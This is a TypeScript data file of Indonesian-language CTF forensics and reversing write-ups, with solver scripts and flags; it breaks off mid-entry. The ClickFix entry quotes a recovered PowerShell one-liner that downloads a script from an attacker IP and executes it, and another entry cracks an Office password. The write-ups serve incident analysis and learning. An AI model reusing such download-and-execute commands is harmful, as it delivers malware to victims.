import type { WriteUp } from "../types";

export const citctfWriteups: WriteUp[] = [
  {
    "id": "citctf-foren-larping101",
    "title": "Forensic - Larping 101",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Writeup for challenge Forensic - Larping 101",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Kategori: Forensic\n- File: `challenge.pptx`\n- SHA1 valid: `e72c9837de62168b2b5cc573a55800ea1e440b42`"
      },
      {
        "title": "1. Initial Recon",
        "content": "Cek tipe file dan hash:\n\nHasil menunjukkan file adalah `Microsoft OOXML` (PPTX), artinya sebenarnya arsip ZIP berisi struktur XML dan media.",
        "code": "sha1sum challenge.pptx\nfile challenge.pptx"
      },
      {
        "title": "2. Triage Cepat",
        "content": "Cek metadata:\n\nMetadata normal (LibreOffice template), belum ada flag langsung.\n\nLalu lihat isi internal PPTX:\n\nTerlihat struktur umum PowerPoint, termasuk folder `ppt/slides/` dan file tambahan `ppt/slides/transitions.xml`.",
        "code": "exiftool challenge.pptx"
      },
      {
        "title": "3. Ekstraksi Layer",
        "content": "Ekstrak seluruh isi:",
        "code": "unzip -q challenge.pptx -d extracted"
      },
      {
        "title": "4. Pencarian Konten Mencurigakan",
        "content": "Lakukan pencarian keyword dan pattern CTF di hasil ekstraksi:\n\n\nDitemukan temuan penting di:\n- `extracted/ppt/slides/transitions.xml` baris berisi string flag.\n\nVerifikasi cepat:",
        "code": "rg -n -i \"flag|ctf|cit|hidden|secret\" extracted"
      },
      {
        "title": "Kesimpulan",
        "content": "Flag disisipkan pada file XML transisi slide (`transitions.xml`) di dalam paket OOXML PPTX, bukan pada metadata gambar atau konten slide utama. Teknik utamanya adalah membongkar container PPTX lalu melakukan grep/pattern matching pada seluruh artefak XML."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport sys\r\nimport zipfile\r\n\r\nFLAG_RE = re.compile(r\"CIT\\{[^\\r\\n\\t\\f\\v\\}]+\\}\")\r\n\r\n\r\ndef main() -> int:\r\n    target = sys.argv[1] if len(sys.argv) > 1 else \"challenge.pptx\"\r\n\r\n    try:\r\n        with zipfile.ZipFile(target, \"r\") as zf:\r\n            hits = []\r\n            for name in zf.namelist():\r\n                try:\r\n                    data = zf.read(name)\r\n                except Exception:\r\n                    continue\r\n\r\n                text = data.decode(\"utf-8\", errors=\"ignore\")\r\n                for m in FLAG_RE.findall(text):\r\n                    hits.append((name, m))\r\n\r\n            if not hits:\r\n                print(\"Flag not found\")\r\n                return 1\r\n\r\n            # Deduplicate while preserving order\r\n            seen = set()\r\n            unique = []\r\n            for src, flag in hits:\r\n                key = (src, flag)\r\n                if key not in seen:\r\n                    seen.add(key)\r\n                    unique.append((src, flag))\r\n\r\n            for src, flag in unique:\r\n                print(f\"[+] {src}: {flag}\")\r\n\r\n            # Print main flag only (first hit) for quick use\r\n            print(unique[0][1])\r\n            return 0\r\n\r\n    except FileNotFoundError:\r\n        print(f\"File not found: {target}\")\r\n        return 1\r\n    except zipfile.BadZipFile:\r\n        print(f\"Not a valid PPTX/ZIP file: {target}\")\r\n        return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{l4rp_l4rp_l4rp_s4hur}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-foren-theclickthatmay",
    "title": "CTF — ClickFix Incident Chain",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "**Event:** CTF@CIT 2026  \n**Category:** Forensics  \n**Difficulty:** Medium  \n**Artifacts:** `challenge.zip` (sudah diekstrak menjadi folder `kurt_backup`)",
    "problemDescription": "Insiden ini memperlihatkan pola klasik ClickFix:\n\n1. Korban mencari “download more RAM” lalu diarahkan ke halaman jebakan.\n2. Halaman memancing eksekusi PowerShell manual.\n3. Script melakukan konektivitas check ke domain (`unewhaven.com`) dan mengambil payload dari IP `23.179.17.92`.\n4. Infrastruktur attacker terkait ASN `399562`.\n5. Persistence ditanam lewat artefak startup (`e9fje2.txt`) yang berisi penanda/flag encoded.\n\nSecara forensik, korelasi paling kuat datang dari kombinasi:\n\n- Browser History timeline\n- PSReadLine command history\n- Startup folder artifact\n- ASN enrichment IOC IP\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Set",
        "content": "Serangkaian soal ini saling terhubung dari satu artefak forensik user profile Windows. Fokus utamanya adalah investigasi insiden ClickFix/pseudo-captcha yang memaksa korban menjalankan PowerShell.\n\nChallenge yang diselesaikan:\n\n1. `The click that may have fixed`\n2. `Autonomous`\n3. `Ping Pong`\n4. `Start Me Up`\n\n---"
      },
      {
        "title": "Initial Recon",
        "content": "Struktur data menunjukkan backup profil user Windows dengan artefak browser dan user activity yang cukup lengkap:\n\n- `AppData/Local/Microsoft/Edge/User Data/Default/History`\n- `AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt`\n- `AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/e9fje2.txt`\n\nIOC kunci yang ditemukan dari PowerShell history:\n\n\n\nDari sini terlihat alur: ping domain tertentu, download payload PowerShell dari IP langsung, lalu eksekusi.\n\n---",
        "code": "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser\n$p='unewhaven.com'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Destination $c; & $c"
      },
      {
        "title": "1) The click that may have fixed",
        "content": "**Pertanyaan:** kapan website berbahaya itu terakhir dikunjungi?\n\nLangkah utama:\n\n- Query DB `History` (SQLite) milik Edge.\n- Ambil entri `visits` terbaru yang terkait situs jebakan.\n- Konversi timestamp Chromium (microseconds sejak 1601-01-01 UTC).\n\nTemuan:\n\n- URL terakhir: `https://23.179.17.92:5067/`\n- Title: `Download More RAM!`\n- `visit_time`: `13420969646255949`\n- Konversi UTC: `2026-04-18T07:07:26Z`\n\n**Flag:** `CIT{2026-04-18T07:07:26Z}`\n\n---"
      },
      {
        "title": "2) Autonomous",
        "content": "**Pertanyaan:** ASN apa yang terkait clickfix site?\n\nLangkah utama:\n\n- Ambil IOC IP dari artefak sebelumnya: `23.179.17.92`.\n- Validasi ASN menggunakan BGP/WHOIS lookup.\n\nTemuan:\n\n- IP `23.179.17.92` berada pada ASN `399562` (`IZT-CLOUD-UNIVERSAL / IZT Cloud`).\n\n**Flag:** `CIT{399562}`\n\n---"
      },
      {
        "title": "3) Ping Pong",
        "content": "**Pertanyaan:** website apa yang di-ping oleh script PowerShell?\n\nLangkah utama:\n\n- Baca command history PowerShell (`ConsoleHost_history.txt`).\n- Identifikasi argumen dari `Test-Connection`.\n\nTemuan:\n\n- Script melakukan ping ke: `unewhaven.com`\n\n**Flag:** `CIT{unewhaven.com}`\n\n---"
      },
      {
        "title": "4) Start Me Up",
        "content": "**Pertanyaan:** petunjuk persistence (startup) mengarah ke apa?\n\nLangkah utama:\n\n- Cek folder startup user:\n  `AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/`\n- Ditemukan file `e9fje2.txt` berisi string base64.\n- Decode base64 untuk mendapatkan flag.\n\nTemuan:\n\n- Encoded: `Q0lUe3N0NHJ0X20zX3VwX2kxMV9uM3Yzcl9zdDBwfQ==`\n- Decoded: `CIT{st4rt_m3_up_i11_n3v3r_st0p}`\n\n**Flag:** `CIT{st4rt_m3_up_i11_n3v3r_st0p}`\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport datetime\r\nimport os\r\nimport sqlite3\r\nimport sys\r\n\r\nHISTORY_DEFAULT = os.path.join(\r\n    \"AppData\",\r\n    \"Local\",\r\n    \"Microsoft\",\r\n    \"Edge\",\r\n    \"User Data\",\r\n    \"Default\",\r\n    \"History\",\r\n)\r\n\r\nEPOCH_1601 = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)\r\n\r\n\r\ndef chrome_us_to_utc_iso(ts_us: int) -> str:\r\n    dt = EPOCH_1601 + datetime.timedelta(microseconds=ts_us)\r\n    return dt.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\r\n\r\n\r\ndef get_last_malicious_visit(history_path: str):\r\n    query = \"\"\"\r\n    SELECT u.url, u.title, v.visit_time\r\n    FROM visits v\r\n    JOIN urls u ON u.id = v.url\r\n    WHERE u.url LIKE '%23.179.17.92%'\r\n       OR u.url LIKE '%downloadmoreram%'\r\n       OR u.title LIKE '%Download More RAM%'\r\n    ORDER BY v.visit_time DESC\r\n    LIMIT 1;\r\n    \"\"\"\r\n\r\n    con = sqlite3.connect(history_path)\r\n    try:\r\n        cur = con.cursor()\r\n        cur.execute(query)\r\n        row = cur.fetchone()\r\n        return row\r\n    finally:\r\n        con.close()\r\n\r\n\r\ndef main():\r\n    history_path = HISTORY_DEFAULT\r\n    if len(sys.argv) > 1:\r\n        history_path = sys.argv[1]\r\n\r\n    if not os.path.exists(history_path):\r\n        print(f\"[!] History DB not found: {history_path}\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    row = get_last_malicious_visit(history_path)\r\n    if not row:\r\n        print(\"[!] No suspicious website visit found.\", file=sys.stderr)\r\n        sys.exit(2)\r\n\r\n    url, title, visit_time = row\r\n    ts = chrome_us_to_utc_iso(int(visit_time))\r\n    flag = f\"CIT{{{ts}}}\"\r\n\r\n    print(f\"URL       : {url}\")\r\n    print(f\"Title     : {title}\")\r\n    print(f\"VisitTime : {visit_time}\")\r\n    print(f\"UTC       : {ts}\")\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{399562}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-foren-theevilfile",
    "title": "Forensic - The Evil Files",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Writeup for challenge Forensic - The Evil Files",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Kategori: Forensic\n- Judul: The Evil Files\n- File artefak: `challenge.pdf`\n- SHA1 yang diberikan: `2230cff50d7ae8672ab072d275df7057773f11eb`"
      },
      {
        "title": "Tujuan",
        "content": "Mencari flag dari artefak forensik yang diberikan."
      },
      {
        "title": "1) Initial Recon",
        "content": "Pertama saya cek isi folder dan tipe file:\n\n\n\nHasil penting:\n- Hanya ada satu file: `challenge.pdf`\n- Tipe file valid: PDF 1.7\n- SHA1 file **match** dengan yang di soal:\n  `2230cff50d7ae8672ab072d275df7057773f11eb`\n\nArtinya artefak tidak korup dan kemungkinan memang file utama challenge.",
        "code": "ls -la\nfile challenge.pdf\nsha1sum challenge.pdf"
      },
      {
        "title": "2) Triage Cepat",
        "content": "Saya lakukan ekstraksi metadata dan string ringan:\n\n\n\nMetadata menunjukkan file dibuat dengan LibreOffice Writer dan tidak ada indikasi enkripsi.\n\nLalu saya ekstrak teks PDF secara langsung:\n\n\n\nDi output teks terlihat header seperti email, dan ada baris:\n\n`CC: CIT{m0j0_eng4g3d}`\n\nIni sangat kuat sebagai kandidat flag.",
        "code": "exiftool challenge.pdf\nstrings -n 6 challenge.pdf"
      },
      {
        "title": "3) Validasi Tambahan",
        "content": "Untuk memastikan tidak ada artefak tersembunyi lain, saya cek hal-hal umum:\n\n\n\nTemuan:\n- Tidak ada embedded file (`0 embedded files`)\n- Tidak ada image object yang mencurigakan\n- Ada stream zlib normal untuk struktur PDF (wajar)\n\nTerakhir, saya validasi ulang pola flag di hasil text extraction:\n\n\n\nHanya muncul satu flag yang konsisten.",
        "code": "pdfdetach -list challenge.pdf\npdfimages -list challenge.pdf\nbinwalk challenge.pdf"
      },
      {
        "title": "Catatan",
        "content": "Challenge ini termasuk forensic yang straightforward: flag disisipkan di konten teks dokumen (format mirip header email), bukan lewat stego atau layer enkripsi tambahan."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nimport sys\r\n\r\nPDF_PATH = \"challenge.pdf\"\r\n\r\n\r\ndef extract_text_with_pdftotext(path: str) -> str:\r\n    try:\r\n        out = subprocess.check_output([\"pdftotext\", path, \"-\"], stderr=subprocess.STDOUT)\r\n        return out.decode(\"utf-8\", errors=\"ignore\")\r\n    except FileNotFoundError:\r\n        print(\"Error: pdftotext tidak ditemukan. Install poppler-utils.\")\r\n        sys.exit(1)\r\n    except subprocess.CalledProcessError as e:\r\n        print(\"Gagal ekstrak text dari PDF:\")\r\n        print(e.output.decode(\"utf-8\", errors=\"ignore\"))\r\n        sys.exit(1)\r\n\r\n\r\ndef find_flag(text: str) -> str | None:\r\n    patterns = [\r\n        r\"CIT\\{[^}]+\\}\",\r\n        r\"CTF\\{[^}]+\\}\",\r\n        r\"FLAG\\{[^}]+\\}\",\r\n    ]\r\n    for p in patterns:\r\n        m = re.search(p, text)\r\n        if m:\r\n            return m.group(0)\r\n    return None\r\n\r\n\r\ndef main() -> None:\r\n    path = sys.argv[1] if len(sys.argv) > 1 else PDF_PATH\r\n    text = extract_text_with_pdftotext(path)\r\n    flag = find_flag(text)\r\n\r\n    if not flag:\r\n        print(\"Flag tidak ditemukan.\")\r\n        sys.exit(2)\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{m0j0_eng4g3d}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-foren-tranmission1993",
    "title": "- Transmission from 1993 (Forensic)",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Challenge ini kelihatan seperti suara modem/fax dari judul dan deskripsi:",
    "problemDescription": "Challenge ini kelihatan seperti suara modem/fax dari judul dan deskripsi:\n\n`REEEEEE–KRRR–SKREEEEEE–BEEP BEEP BEEP`\n\nAwalnya saya kira cukup dari RTP audio, tapi ternyata inti flag ada di dokumen fax yang ditransmisikan lewat **T.38**.",
    "tools": [
      "g3topbm"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "1) Recon awal",
        "content": "Artefak hanya satu file:\n\n- `call-69e26052e9f5b0c1da0ee369.pcap`\n\nCek cepat:\n\n\n\nHasil penting:\n\n- capture type: Linux cooked (SLL)\n- 1129 paket\n- trafik utama: SIP + RTP + T.38",
        "code": "file call-69e26052e9f5b0c1da0ee369.pcap\ncapinfos call-69e26052e9f5b0c1da0ee369.pcap"
      },
      {
        "title": "2) Triage protokol (SIP / RTP / T.38)",
        "content": "Statistik protokol:\n\n\n\nTerlihat:\n\n- SIP signaling\n- RTP voice\n- T.38 (fax over IP)\n\nLalu cek SIP call flow:\n\n\n\nAda **re-INVITE** dari audio ke `m=image ... udptl t38`, artinya memang switch ke fax session.",
        "code": "tshark -r call-69e26052e9f5b0c1da0ee369.pcap -q -z io,phs"
      },
      {
        "title": "3) Cek decode T.38 dari tshark",
        "content": "Dari decode tshark, terlihat frame-frame T.30 seperti:\n\n- NSF\n- CSI\n- TSI\n- DCS\n- CFR\n- FCD (facsimile coded data)\n- PPS\n- MCF\n- DCN\n\nArtinya session fax berjalan komplet, bukan noise kosong."
      },
      {
        "title": "5) Decode fax pakai `t38_decode`",
        "content": "Jalankan decoder dengan endpoint T.38:\n\n- src `192.168.0.199:38070`\n- dst `23.179.16.198:34654`\n\nDecoder menghasilkan:\n\n- `t38pcap.tif`\n\nMetadata TIFF menunjukkan dokumen fax valid (bi-level Group 3) dan transfer selesai sukses."
      },
      {
        "title": "6) OCR hasil fax",
        "content": "Dokumen TIFF di-OCR, dan muncul teks yang memuat flag:\n\n`CIT{fL3x_YOur_F4xiNG}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nfrom PIL import Image\r\nimport pytesseract\r\n\r\nROOT = Path(__file__).resolve().parent\r\nPCAP = ROOT / \"call-69e26052e9f5b0c1da0ee369.pcap\"\r\nSPANDSP_TESTS = ROOT / \"spandsp_src\" / \"tests\"\r\nDECODER = SPANDSP_TESTS / \"t38_decode_manual\"\r\nOUTPUT_TIF = SPANDSP_TESTS / \"t38pcap.tif\"\r\n\r\n\r\ndef run(cmd, cwd=None, env=None):\r\n    p = subprocess.run(cmd, cwd=cwd, env=env, capture_output=True, text=True)\r\n    if p.returncode != 0:\r\n        raise RuntimeError(\r\n            f\"Command failed: {' '.join(cmd)}\\nSTDOUT:\\n{p.stdout}\\nSTDERR:\\n{p.stderr}\"\r\n        )\r\n    return p\r\n\r\n\r\ndef ensure_decoder():\r\n    if DECODER.exists():\r\n        return\r\n    raise RuntimeError(\r\n        \"Decoder belum ada. Build dulu dari folder spandsp_src/tests menjadi t38_decode_manual.\"\r\n    )\r\n\r\n\r\ndef decode_t38_to_tiff():\r\n    env = dict(**subprocess.os.environ)\r\n    env[\"LD_LIBRARY_PATH\"] = str((ROOT / \"spandsp_src\" / \"src\" / \".libs\"))\r\n\r\n    cmd = [\r\n        str(DECODER),\r\n        \"-i\",\r\n        str(PCAP),\r\n        \"-S\",\r\n        \"192.168.0.199\",\r\n        \"-s\",\r\n        \"38070\",\r\n        \"-D\",\r\n        \"23.179.16.198\",\r\n        \"-d\",\r\n        \"34654\",\r\n    ]\r\n    run(cmd, cwd=SPANDSP_TESTS, env=env)\r\n\r\n    if not OUTPUT_TIF.exists():\r\n        raise RuntimeError(\"TIFF output tidak ditemukan setelah decode T.38\")\r\n\r\n\r\ndef ocr_flag():\r\n    img = Image.open(OUTPUT_TIF)\r\n    text = pytesseract.image_to_string(img.convert(\"L\"), config=\"--psm 6\")\r\n    m = re.search(r\"CIT\\{[^}]+\\}\", text)\r\n    if not m:\r\n        # fallback OCR mode\r\n        text2 = pytesseract.image_to_string(img.convert(\"L\"), config=\"--psm 4\")\r\n        m = re.search(r\"CIT\\{[^}]+\\}\", text2)\r\n    if not m:\r\n        raise RuntimeError(\"Flag tidak ditemukan dari OCR fax\")\r\n    return m.group(0)\r\n\r\n\r\ndef main():\r\n    if not PCAP.exists():\r\n        print(f\"PCAP tidak ditemukan: {PCAP}\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    ensure_decoder()\r\n    decode_t38_to_tiff()\r\n    flag = ocr_flag()\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{fL3x_YOur_F4xiNG}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-foren-yougottarunrunrunrunrun",
    "title": "CTF — You gotta run, run, run, run, run",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "**Event:** CTF@CIT 2026  \n**Category:** Forensics / Windows Persistence  \n**Difficulty:** Medium  \n**Flag:** `CIT{AzureTenant}`",
    "problemDescription": "**Event:** CTF@CIT 2026  \n**Category:** Forensics / Windows Persistence  \n**Difficulty:** Medium  \n**Flag:** `CIT{AzureTenant}`\n\n---",
    "tools": [],
    "analysis": "Gejala \"black box flash saat login\" sangat konsisten dengan payload yang dijalankan dari key `Run` (sering memunculkan jendela `cmd`/proses singkat di startup user session).\n\nDengan demikian, nama persistence yang dimaksud adalah:\n\n- `AzureTenant`\n\n---",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Waiter, waiter! More persistence mechanisms please!!\n>\n> Yet another persistence mechanism seems to have been setup. It's funny because I remember the user saying everytime they logged into their system, something just felt odd when they'd see some sort of black box flash on their screen. There must be a name associated with what this is..\n\n**File:** `challenge.dat`\n\n---"
      },
      {
        "title": "Step 1 — Identify artifact type",
        "content": "Output menunjukkan ini adalah **Windows Registry hive** (`NTUSER.DAT` type), jadi fokus analisis diarahkan ke key persistence user-level.",
        "code": "file challenge.dat"
      },
      {
        "title": "Step 2 — Parse common autorun keys",
        "content": "Temuan penting:\n\n- Key: `Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- Value mencurigakan:\n  - `AzureTenant - \"C:\\Users\\kurt\\AppData\\Roaming\\fj3493.exe\"`\n\nNama value inilah yang diminta challenge.\n\n---",
        "code": "regripper -r challenge.dat -p run"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\ndef run_regripper(hive_path: Path) -> str:\r\n    cmd = [\"regripper\", \"-r\", str(hive_path), \"-p\", \"run\"]\r\n    res = subprocess.run(cmd, capture_output=True, text=True)\r\n    if res.returncode != 0:\r\n        raise RuntimeError(f\"regripper failed: {res.stderr.strip()}\")\r\n    return res.stdout\r\n\r\n\r\ndef extract_persistence_name(rr_output: str) -> str:\r\n    # Target format line example:\r\n    #   AzureTenant - \"C:\\\\Users\\\\kurt\\\\AppData\\\\Roaming\\\\fj3493.exe\"\r\n    m = re.search(r\"^\\s*([A-Za-z0-9_\\-]+)\\s+-\\s+\\\"[A-Za-z]:\\\\\\\\.*?\\\"\\s*$\", rr_output, re.M)\r\n    if m:\r\n        return m.group(1)\r\n\r\n    # Fallback: specifically grab the suspicious value if present\r\n    m2 = re.search(r\"^\\s*(AzureTenant)\\s+-\\s+\", rr_output, re.M)\r\n    if m2:\r\n        return m2.group(1)\r\n\r\n    raise ValueError(\"Could not find persistence value name in Run key output\")\r\n\r\n\r\ndef main() -> int:\r\n    default_hive = Path(__file__).resolve().parent / \"challenge.dat\"\r\n    hive = Path(sys.argv[1]) if len(sys.argv) > 1 else default_hive\r\n\r\n    if not hive.exists():\r\n        print(f\"[!] Hive not found: {hive}\")\r\n        return 1\r\n\r\n    try:\r\n        out = run_regripper(hive)\r\n        name = extract_persistence_name(out)\r\n        print(f\"Persistence name: {name}\")\r\n        print(f\"CIT{{{name}}}\")\r\n        return 0\r\n    except Exception as e:\r\n        print(f\"[!] Error: {e}\")\r\n        return 2\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{AzureTenant}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-misc-whattheword",
    "title": "- What's the word?",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Kategori: misc  \nNama challenge: **What's the word?**",
    "problemDescription": "File challenge cuma satu, namanya `file`. Dari deskripsi dan hint, terlihat ini soal nyari sesuatu yang \"tersembunyi\" di dalam file.",
    "tools": [],
    "analysis": "Langsung cek tipe file:\n\n```bash\nfile file\n```\n\nHasil: `CDFV2 Encrypted`.\n\nIni khas dokumen Microsoft Office yang dienkripsi (container OLE dengan `EncryptionInfo` + `EncryptedPackage`).\n\nLalu cek isi container:\n\n```bash\n7z l file\n```\n\nTerlihat stream penting:\n- `EncryptionInfo`\n- `EncryptedPackage`\n\nBerarti memang dokumen Office terenkripsi, jadi harus dapat password dulu.",
    "solution": [
      {
        "title": "2. Crack password dokumen",
        "content": "Extract hash Office pakai John helper:\n\n\n\nLalu crack dengan wordlist bawaan John:\n\n\n\nPassword ketemu:\n\n`q1w2e3r4t5`",
        "code": "office2john.py file > hash.txt"
      },
      {
        "title": "3. Decrypt dokumen",
        "content": "Decrypt dokumen dengan `msoffcrypto-tool` / library `msoffcrypto`.\n\nSetelah decrypt, file hasilnya adalah DOCX (zip-based Office document).\n\nIsi dokumen ternyata cuma gambar:\n\n`word/media/image1.png`"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{bird_1s_th3_w0rd}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-rev-catacombs",
    "title": "Catacombs (rev)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Challenge ini ternyata berupa binary interaktif yang memodelkan **state machine** dengan perintah seperti:\n- `step <syscall>`\n- `script a b c ...`\n- `submit`",
    "problemDescription": "Challenge ini ternyata berupa binary interaktif yang memodelkan **state machine** dengan perintah seperti:\n- `step <syscall>`\n- `script a b c ...`\n- `submit`\n\nDari output `help` dan `hint`, kita dapat petunjuk penting:\n- Dibutuhkan syscall tertentu dengan jumlah tertentu (`openat x2`, `read x2`, `mmap x1`, `ioctl x2`, `futex x1`, `clone x1`, `close x1`)\n- `close` harus masuk ke `sanctum` dari `sysproxy`\n- Ada constraint urutan (dua `openat` mengapit path fork)",
    "tools": [],
    "analysis": "Binary bisa dijalankan langsung dan menampilkan prompt interaktif.\n\nPerintah `status` menunjukkan state internal (node, steps, accumulator).\nPerintah `step` menunjukkan transisi node nyata, contoh:\n`hook openat -> node 3 (sepulcher)`\n\nDari sini jelas bahwa challenge berbentuk graph traversal + validasi akhir saat `submit`.",
    "solution": [
      {
        "title": "2. Reverse cepat",
        "content": "Dengan disassembly simbol lokal:\n- `parseOpName`\n- `applyVisibleStep`\n- `applyStepCore`\n- `validate`\n\n`applyVisibleStep` membaca transisi dari `EDGE_TABLE` di `.rodata`.\nArtinya setiap syscall dari node tertentu akan pindah ke node lain secara deterministik.\n\n`validate` sendiri di-obfuscate, jadi pendekatan paling stabil adalah oracle-based: jalankan `submit` dan cek apakah output `ACCESS GRANTED`."
      },
      {
        "title": "3. Pencarian urutan valid",
        "content": "Saya brute-force semua permutasi unik dari multiset syscall sesuai hint (total 328396 kandidat unik dieksplor sebelum ketemu solusi).\n\nUrutan yang valid:\n- `openat mmap ioctl read futex clone openat ioctl read close`\n\nSaat dikirim via command `script ...` lalu `submit`, outputnya:\n- `ACCESS GRANTED: CIT{3R2rA2J0PdFH}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\n\r\nBIN = \"./catacombs\"\r\nSEQ = [\r\n    \"openat\",\r\n    \"mmap\",\r\n    \"ioctl\",\r\n    \"read\",\r\n    \"futex\",\r\n    \"clone\",\r\n    \"openat\",\r\n    \"ioctl\",\r\n    \"read\",\r\n    \"close\",\r\n]\r\n\r\n\r\ndef run_solver() -> str:\r\n    payload = \"script \" + \" \".join(SEQ) + \"\\nsubmit\\n\"\r\n    out = subprocess.check_output([BIN], input=payload, text=True)\r\n    m = re.search(r\"CIT\\{[^\\n\\r}]+\\}\", out)\r\n    if not m:\r\n        raise RuntimeError(\"Flag not found. Full output:\\n\" + out)\r\n    return m.group(0)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    print(run_solver())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{3R2rA2J0PdFH}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-rev-escaperoom",
    "title": "- Escape Room (rev)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Challenge ini bentuknya binary menu interaktif. Targetnya cari token override yang benar supaya keluar flag format `CIT{...}`.",
    "problemDescription": "Challenge ini bentuknya binary menu interaktif. Targetnya cari token override yang benar supaya keluar flag format `CIT{...}`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1) Recon awal",
        "content": "File yang ada cuma satu binary:\n\n- `escaperoom` (ELF64, static linked, not stripped)\n\nSaat dijalankan, muncul menu dengan opsi:\n\n- ubah state ruangan (lampu, ventilasi, kamera, patch, battery)\n- maintenance shell (`mirror`, `hush`, `decode`, dst)\n- submit token override\n\nDari output runtime doang sudah kelihatan kalau ini challenge state-machine + validasi token."
      },
      {
        "title": "2) Cari fungsi penting",
        "content": "Dari symbol table (karena tidak stripped), fungsi-fungsi kunci gampang ketemu:\n\n- `roomAligned()`\n- `roomSignature()`\n- `buildOverrideToken()`\n- `validate()`\n- `enterOverrideToken()`\n- `maintenanceConsole()`\n\nIntinya:\n\n- `enterOverrideToken()` baca input token, panggil `validate()`, lalu print result.\n- `validate()` akan compare input dengan token hasil `buildOverrideToken()`, tapi **hanya** kalau kondisi room benar.\n- Kalau kondisi belum benar, balikin `ACCESS_DENIED`."
      },
      {
        "title": "3) Turunin kondisi state yang wajib",
        "content": "Dari `roomAligned()` dan cabang di `maintenanceConsole()` didapat syarat:\n\n- lights harus OFF\n- vent index harus 1\n- camera bus harus 3 (mirror relay)\n- door patch count harus 2\n- battery bridge harus ON\n- flag `mirror` harus aktif\n- flag `hush` harus aktif\n\nUrutan aksinya jadi:\n\n1. `2` (toggle lights -> OFF)\n2. `3` (vent dari 0 ke 1)\n3. `4` tiga kali (camera 0 -> 1 -> 2 -> 3)\n4. `5` dua kali (patch jadi 2)\n5. `6` (battery ON)\n6. masuk `7` (maintenance shell), jalankan `mirror`, lalu `hush`, lalu `back`"
      },
      {
        "title": "4) Reversing generator token",
